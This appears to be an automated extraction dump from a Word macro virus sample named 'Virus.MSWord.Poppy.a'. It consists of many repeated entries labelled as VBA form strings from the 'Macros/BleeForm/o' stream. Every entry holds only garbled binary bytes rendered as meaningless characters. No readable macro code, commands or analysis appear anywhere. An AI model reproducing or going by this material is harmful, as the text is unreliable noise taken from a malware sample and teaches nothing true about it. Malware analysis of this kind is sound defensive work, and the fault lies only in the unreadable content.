VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H;�&9�vP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ڪu�k<5w'RQ�c�Vݴ����S���<2I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�#xة$�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#ů�i��-:�<�v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`1��q��pm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9ݻ���z��q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��
J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�GKC6�ɋ���LD�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
85	����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+�N�i�*�{f��Wkպ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�V�<k(Fe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8$s�G�c�i��uIٛӢ�]��qn�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�cZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X����~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y�TI"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oF��D�$22I$j��=��"���^�_�{�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ֺ=)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TԶ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W��jg�[�ib�y"9e!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�k�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�к�_d��i�8�Փ�-{�J%K�J���&ɼ�d4���O����M�h�,Txf�f��z��~���Uws�6;}�[X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z7���\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������SX�Vx�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\N�|��NY<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_��v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���N��/&�aӶ랧��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k+!�x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jt�0ZdXޥ��?���&{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�]�S�&���.�Rj�&��GAi���b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�Y�1G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0P������N��_�-ι�nZNߦ�m�`�Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U)�����k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[m�Í�ßmu^��_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�AIr��<�ű"�3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��u5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^����"H�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�k�o}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�zk�VUK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v��U	�ˮI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��e�)���Y��4�F����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!y�9�U�:՛I� �t��D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�*~bI˖��@��W���Ҋ+�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|����a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[j$����q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l��<��5����(g�5JQ�JғE(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|̪�{I�90A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+|�w�*�?�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������́���#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X�<F��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h�����UD���$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
쭹C.�W 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B��㦝
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I������:
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�	�5�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�79��O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�eY6��=t5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MKIUG$U!*�:�t�H&)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��nJ�Mʠ�J�b E/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r܁�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���K�~�����W�P����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A2���e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!���-	��J�K�s�KO<��:{]*3���ff
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~_22
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������j[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��PS�&��+�Yf�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��NV"NX�''8=G��f/ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F�Lq��Y�;���a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֒}D��G�=:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�MS��6l��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K�꛷5n��h>��u���C�zZ�CAB�:Z�w���&
�ġ�)|(f��Y�ϸ��Ե�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�N�7����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɻw�\r�@:�8;�D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dv��ƀ��MO����ֿ��i�\{}�7�7�u����OYW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3H��s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%V<��_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t��S^�����6;5�J݅\��$�mH�)!z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��)3�m��i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�=��=eM�����I��&�h`����GQ��E;)z5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2bH�2�Z�%qU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@뚾�j+}>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l���WP��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%��:�Ue4ԳG+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��U�h.�hk���P���=��-%]>��D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʮ��ta�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����TxA�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z+�:�Zj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gF�<��x�5�*�ଅ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]J�WFf�~;����ލK��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k>��ޮ��[���GjKdlr"B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qG�$�W?�Nj�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X���3���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�m�ӯ�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��*�=2<rƔ�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�fM�����h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���w{���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ں����[uʆx��P$);UF����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dy��cH�b�)�c�w�m����z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�7K�o;�[��&���Z������+���'k�	G���
�9c�x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�i;�l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M+�
�B�->��4Z��KPV�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�=bT�$sLg�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#W���`�s��N��6����+ޠ�v:�zmC���q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ҫ��m��Z%�HD��,�ԉXa��?t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u״
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݣ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�jKN���O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R80�
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����J�_�4n�x��^��{P�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3Z��~ԭzO��E0�{7~Gߜ|��R�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�	#�����~���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OG|d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�+�5"41E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z�.�3�S+E$�SA+�D�
-------------------------------------------------------------------------------
